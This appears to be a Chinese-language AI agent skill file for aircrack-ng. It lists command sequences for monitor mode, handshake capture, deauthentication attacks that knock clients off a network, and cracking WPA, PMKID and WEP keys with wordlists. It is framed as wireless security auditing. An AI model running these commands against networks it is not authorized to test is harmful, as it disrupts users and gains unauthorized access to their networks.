---
name: aircrack-ng
description: >
  此技能适用于用户询问关于 "aircrack-ng"、"评估无线网络安全"、"恢复 Wi-Fi 凭据" 等内容。802.11 WEP/WPA/WPA2 审计套件 — 捕获握手包、执行去认证攻击 (deauth attacks) 并破解 Wi-Fi 密码。
---

# Aircrack-ng

802.11 无线审计套件 — WEP/WPA/WPA2 抓包与破解。

## 快速开始

```bash
apt install aircrack-ng

# 1. 开启监听模式
airmon-ng start wlan0    # 创建 wlan0mon

# 2. 发现网络
airodump-ng wlan0mon

# 3. 捕获目标握手包
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. 对客户端发送去认证包（在独立终端中）以强制重新握手
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. 破解 WPA 握手包
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

## 工具套件

| 工具 | 用途 |
|------|---------|
| `airmon-ng` | 监听模式管理 |
| `airodump-ng` | 数据包捕获 / AP 发现 |
| `aireplay-ng` | 数据包注入 / 去认证 |
| `aircrack-ng` | WEP/WPA 破解 |
| `airdecap-ng` | 解密已捕获的流量 |
| `airgraph-ng` | 可视化网络拓扑 |

## 常见工作流程

**WPA PMKID 攻击（无需客户端）：**
```bash
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hashes.22000
hashcat -m 22000 hashes.22000 rockyou.txt
```

**WEP 破解：**
```bash
airodump-ng -c 11 --bssid BSSID -w wep wlan0mon
aireplay-ng -3 -b BSSID wlan0mon   # ARP 重放
aircrack-ng wep-01.cap              # 收集足够 IV 后自动破解
```

## 资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | PMKID 工作流程与适配器兼容性 |
